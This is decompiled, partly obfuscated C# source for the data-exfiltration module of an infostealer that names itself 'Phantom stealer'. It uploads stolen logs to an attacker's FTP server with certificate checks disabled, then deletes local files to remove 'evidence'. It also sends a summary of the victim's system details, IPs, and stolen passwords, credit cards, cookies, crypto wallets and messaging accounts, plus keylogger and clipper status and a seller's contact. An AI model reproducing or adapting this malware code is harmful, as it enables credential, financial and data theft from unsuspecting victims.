using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000044 RID: 68
	internal sealed class FtpSendLogs
	{
		// Token: 0x06000142 RID: 322 RVA: 0x0000F520 File Offset: 0x0000D720
		public static async Task SendMessageAsync(string ftpHost, string ftpUsername, string ftpPassword, string localFilePath, bool useSsl = true, bool usePassive = true)
		{
			FtpWebResponse response2;
			object obj;
			WebException ex3;
			bool flag;
			WebException ex;
			try
			{
				if (useSsl)
				{
					ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(FtpSendLogs.IgnoreCertificateValidation);
				}
				string fileName = Path.GetFileName(localFilePath);
				string ftpUri = "ftp://" + ftpHost + "/" + fileName;
				FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftpUri);
				request.Method = "STOR";
				request.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
				request.EnableSsl = useSsl;
				request.UsePassive = usePassive;
				request.KeepAlive = false;
				request.Timeout = 30000;
				request.ReadWriteTimeout = 30000;
				using (FileStream fileStream = File.OpenRead(localFilePath))
				{
					Stream stream = await request.GetRequestStreamAsync().ConfigureAwait(false);
					Stream requestStream = stream;
					stream = null;
					try
					{
						byte[] buffer = new byte[65536];
						for (;;)
						{
							ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter configuredTaskAwaiter = fileStream.ReadAsync(buffer, 0, buffer.Length).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter.IsCompleted)
							{
								await configuredTaskAwaiter;
								ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter configuredTaskAwaiter2;
								configuredTaskAwaiter = configuredTaskAwaiter2;
								configuredTaskAwaiter2 = default(ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter);
							}
							int result = configuredTaskAwaiter.GetResult();
							int bytesRead;
							if ((bytesRead = result) <= 0)
							{
								break;
							}
							ConfiguredTaskAwaitable.ConfiguredTaskAwaiter configuredTaskAwaiter3 = requestStream.WriteAsync(buffer, 0, bytesRead).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter3.IsCompleted)
							{
								await configuredTaskAwaiter3;
								ConfiguredTaskAwaitable.ConfiguredTaskAwaiter configuredTaskAwaiter4;
								configuredTaskAwaiter3 = configuredTaskAwaiter4;
								configuredTaskAwaiter4 = default(ConfiguredTaskAwaitable.ConfiguredTaskAwaiter);
							}
							configuredTaskAwaiter3.GetResult();
						}
						buffer = null;
					}
					finally
					{
						if (requestStream != null)
						{
							((IDisposable)requestStream).Dispose();
						}
					}
					requestStream = null;
				}
				FileStream fileStream = null;
				ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter configuredTaskAwaiter5 = request.GetResponseAsync().ConfigureAwait(false).GetAwaiter();
				if (!configuredTaskAwaiter5.IsCompleted)
				{
					await configuredTaskAwaiter5;
					ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter configuredTaskAwaiter6;
					configuredTaskAwaiter5 = configuredTaskAwaiter6;
					configuredTaskAwaiter6 = default(ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter);
				}
				WebResponse webResponse = configuredTaskAwaiter5.GetResult();
				FtpWebResponse response = (FtpWebResponse)webResponse;
				webResponse = null;
				try
				{
					Logging.Log("Upload complete: " + response.StatusDescription, true);
				}
				finally
				{
					if (response != null)
					{
						((IDisposable)response).Dispose();
					}
				}
				response = null;
				fileName = null;
				ftpUri = null;
				request = null;
			}
			catch when (delegate
			{
				// Failed to create a 'catch-when' expression
				ex3 = obj as WebException;
				if (ex3 == null)
				{
					flag = false;
				}
				else
				{
					ex = ex3;
					response2 = ex.Response as FtpWebResponse;
					flag = (response2 != null) > false;
				}
				endfilter(flag);
			})
			{
				Logging.Log(string.Format("FTP Error: {0} - {1}", response2.StatusCode, response2.StatusDescription), true);
				throw;
			}
			catch (Exception ex2)
			{
				Logging.Log("FTP upload failed: " + ex2.Message, true);
				throw;
			}
		}

		// Token: 0x06000143 RID: 323 RVA: 0x0000F58C File Offset: 0x0000D78C
		private static bool IgnoreCertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return true;
		}

		// Token: 0x06000144 RID: 324 RVA: 0x0000F59C File Offset: 0x0000D79C
		public static async Task SendMessageInfoAsync()
		{
			string localFilePath = Path.Combine(Path.GetTempPath(), "Log_Summaries.txt");
			string text = Config.Version;
			string text2 = SystemInfo.GetSystemVersion();
			string text3 = SystemInfo.Username;
			string text4 = SystemInfo.Compname;
			string text5 = Flags.GetFlag(SystemInfo.Culture.Split(new char[] { '-' })[1]);
			string text6 = SystemInfo.Culture;
			string text7 = SystemInfo.GetAntivirus();
			string text8 = SystemInfo.GetDefaultGateway();
			string text9 = SystemInfo.GetLocalIp();
			TaskAwaiter<string> taskAwaiter = SystemInfo.GetPublicIpAsync().GetAwaiter();
			if (!taskAwaiter.IsCompleted)
			{
				await taskAwaiter;
				TaskAwaiter<string> taskAwaiter2;
				taskAwaiter = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter<string>);
			}
			string text10 = taskAwaiter.GetResult();
			string info = string.Concat(new string[]
			{
				"\n\ud83d\ude39 *Phantom stealer ",
				text,
				" - Report:*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83d\udcc5 Date: ",
				SystemInfo.Datenow,
				"\n\ud83d\udda5\ufe0f System: ",
				text2,
				"\n\ud83d\udc64 Username: ",
				text3,
				"\n\ud83d\udcbb CompName: ",
				text4,
				"\n\ud83c\udf10 Language: ",
				text5,
				" ",
				text6,
				"\n\ud83d\udee1\ufe0f Antivirus: ",
				text7,
				"\n\n*NETWORK INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83c\udf10 Gateway IP: ",
				text8,
				"\n\ud83d\udd12 Internal IP: ",
				text9,
				"\n\ud83c\udf0d External IP: ",
				text10,
				"\n\n*BROWSER RECOVERIES*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords),
				Counter.GetIValue("\ud83d\udcb3 Credit Cards", Counter.CreditCards),
				Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				"\n\n*SOFTWARE & ACCOUNTS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udd0c FTP Hosts", Counter.FtpHosts),
				Counter.GetIValue("\ud83d\udd12 VPN Accounts", Counter.Vpn),
				Counter.GetSValue("\ud83d\udce7 Outlook", Counter.Outlook),
				Counter.GetSValue("\ud83d\udce7 FoxMail", Counter.FoxMail),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				Counter.GetSValue("\ud83d\udc7e Discord", Counter.Discord),
				Counter.GetSValue("\ud83d\udcac WinScp", Counter.WinScp),
				"\n\n*Grabbed Files*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb3 Images", Counter.GrabberImages),
				Counter.GetIValue("\ud83d\udcac Documents", Counter.GrabberDocuments),
				Counter.GetIValue("\ud83d\udda5\ufe0f Databases", Counter.GrabberDatabases),
				Counter.GetIValue("\ud83d\udd0c SourceCodes", Counter.GrabberSourceCodes),
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				"\n\n*DEVICE INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udce1 WiFi Networks", Counter.SavedWifiNetworks),
				"\n\n*INSTALLATION STATUS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetBValue(Config.Startup == "1", "✅ Startup: Enabled", "⛔ Startup: Disabled"),
				Counter.GetBValue(Config.Debug == "1", "✅ Debug Mode: Enabled", "⛔ Debug Mode: Disabled"),
				Counter.GetBValue(Config.AntiAnalysis == "1", "✅ AntiAnalysis: Enabled", "⛔ AntiAnalysis: Disabled"),
				Counter.GetBValue(Config.Keylogger == "1", "✅ Keylogger: Enabled", "⛔ Keylogger: Disabled"),
				Counter.GetBValue(Config.Screenshot == "1", "✅ Screenshot: Enabled", "⛔ Screenshot: Disabled"),
				Counter.GetBValue(Config.ClipperCheckBox == "1", "✅ CryptoClipper: Enabled", "⛔ CryptoClipper: Disabled"),
				Counter.GetBValue(Config.FileGrabberCheckBox == "1", "✅ FileGrabber: Enabled", "⛔ FileGrabber: Disabled"),
				"\n\n Telegram contact https://t.me/Oldphantomoftheopera\n\n website https://www.phantomsoftwares.site/home"
			});
			text = null;
			text2 = null;
			text3 = null;
			text4 = null;
			text5 = null;
			text6 = null;
			text7 = null;
			text8 = null;
			text9 = null;
			text10 = null;
			File.WriteAllText(localFilePath, info);
			TaskAwaiter taskAwaiter3 = FtpSendLogs.SendMessageAsync(FtpSendLogs.ftpHost, FtpSendLogs.ftpUsername, FtpSendLogs.ftpPassword, localFilePath, true, true).GetAwaiter();
			if (!taskAwaiter3.IsCompleted)
			{
				await taskAwaiter3;
				TaskAwaiter taskAwaiter4;
				taskAwaiter3 = taskAwaiter4;
				taskAwaiter4 = default(TaskAwaiter);
			}
			taskAwaiter3.GetResult();
		}

		// Token: 0x06000145 RID: 325 RVA: 0x0000F5DC File Offset: 0x0000D7DC
		public static async Task SendReportAsync(string file = null)
		{
			Logging.Log("Uploading logs to Ftp", true);
			TaskAwaiter taskAwaiter = UploadToFtp.UploadAllAsync(FtpSendLogs.ftpHost, FtpSendLogs.ftpUsername, FtpSendLogs.ftpPassword, true, true).GetAwaiter();
			TaskAwaiter taskAwaiter2;
			if (!taskAwaiter.IsCompleted)
			{
				await taskAwaiter;
				taskAwaiter = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter);
			}
			taskAwaiter.GetResult();
			string workDir = Paths.InitWorkDir();
			string[] filesToDelete = (from f in Directory.GetFiles(workDir)
				where new string[] { ".txt", ".png", ".json" }.Contains(Path.GetExtension(f).ToLower())
				select f).ToArray<string>();
			foreach (string fileToDelete in filesToDelete)
			{
				try
				{
					Logging.Log("Upload Complete, deleting any evidence", true);
					File.Delete(fileToDelete);
					Logging.Log("Deleted: " + fileToDelete, true);
				}
				catch (Exception ex)
				{
					Logging.Log("Failed to delete " + fileToDelete + ": " + ex.Message, true);
				}
				fileToDelete = null;
			}
			string[] array = null;
			Logging.Log("Sending Log summary to Ftp", true);
			TaskAwaiter taskAwaiter3 = FtpSendLogs.SendMessageInfoAsync().GetAwaiter();
			if (!taskAwaiter3.IsCompleted)
			{
				await taskAwaiter3;
				taskAwaiter3 = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter);
			}
			taskAwaiter3.GetResult();
			Logging.Log("Summary Successfully Sent", true);
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00003D4D File Offset: 0x00001F4D
		public FtpSendLogs()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			this.useSsl = true;
			this.usePassive = true;
			base..ctor();
		}

		// Token: 0x06000147 RID: 327 RVA: 0x00003D68 File Offset: 0x00001F68
		static FtpSendLogs()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			FtpSendLogs.ftpHost = Config.FtpHost;
			FtpSendLogs.ftpUsername = Config.FtpUser;
			FtpSendLogs.ftpPassword = Config.FtpPass;
		}

		// Token: 0x0400015B RID: 347
		private static string ftpHost;

		// Token: 0x0400015C RID: 348
		private static string ftpUsername;

		// Token: 0x0400015D RID: 349
		private static string ftpPassword;

		// Token: 0x0400015E RID: 350
		private bool useSsl;

		// Token: 0x0400015F RID: 351
		private bool usePassive;
	}
}
